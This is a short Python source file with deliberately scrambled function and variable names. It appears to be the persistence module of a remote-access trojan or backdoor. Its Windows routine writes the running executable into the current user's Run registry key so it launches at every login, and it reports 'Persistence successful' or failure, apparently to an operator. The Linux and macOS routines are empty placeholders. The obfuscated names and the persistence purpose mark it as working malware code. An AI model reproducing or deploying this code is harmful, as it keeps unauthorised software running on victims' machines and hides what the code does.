# -*- coding: utf-8 -*-
import sys
def gpuvQaBSRjQbhRuhgkOUzfdlytgIWMRl():
    import _winreg
    from _winreg import HKEY_CURRENT_USER as HKCU
    qzcAuDoEOmrKSvpXDZqBZgmaHYFacZUI = r'Software\Microsoft\Windows\CurrentVersion\Run'
    hrDANUGItcHLiQxpyBsAEgATnZBBMVJn = sys.executable
    try:
        dWWxcpmpAuSyrUGMEpCsbSVpllfejpJh = _winreg.OpenKey(HKCU, qzcAuDoEOmrKSvpXDZqBZgmaHYFacZUI, 0, _winreg.KEY_WRITE)
        _winreg.SetValueEx(dWWxcpmpAuSyrUGMEpCsbSVpllfejpJh, 'br', 0, _winreg.REG_SZ, hrDANUGItcHLiQxpyBsAEgATnZBBMVJn)
        _winreg.CloseKey(dWWxcpmpAuSyrUGMEpCsbSVpllfejpJh)
        return True, 'HKCU Run registry key applied'
    except WindowsError:
        return False, 'HKCU Run registry key failed'
def wyWCEpwTfXPZAjKOWPETAKynrcWaImvq():
    return False, 'nothing here yet'
def iPbgydrYGkiKiDevcVPXBuLvAIItaXKV():
    return False, 'nothing here yet'
def XkzeDrNjOxKRNFyUvDKlNpoqbMQVKThp(plat_type):
    if plat_type.startswith('win'):
        success, QofRAsnKjryHQyYBVUaUULoipmdslxse = gpuvQaBSRjQbhRuhgkOUzfdlytgIWMRl()
    elif plat_type.startswith('linux'):
        success, QofRAsnKjryHQyYBVUaUULoipmdslxse = wyWCEpwTfXPZAjKOWPETAKynrcWaImvq()
    elif plat_type.startswith('darwin'):
        success, QofRAsnKjryHQyYBVUaUULoipmdslxse = iPbgydrYGkiKiDevcVPXBuLvAIItaXKV()
    else:
        return 'Error, platform unsupported.'
    if success:
        WqGavNByNiJmJFFTbOBHPCDHbDVGVcOO = 'Persistence successful, {}.'.format(QofRAsnKjryHQyYBVUaUULoipmdslxse)
    else:
        WqGavNByNiJmJFFTbOBHPCDHbDVGVcOO = 'Persistence unsuccessful, {}.'.format(QofRAsnKjryHQyYBVUaUULoipmdslxse)
    return WqGavNByNiJmJFFTbOBHPCDHbDVGVcOO
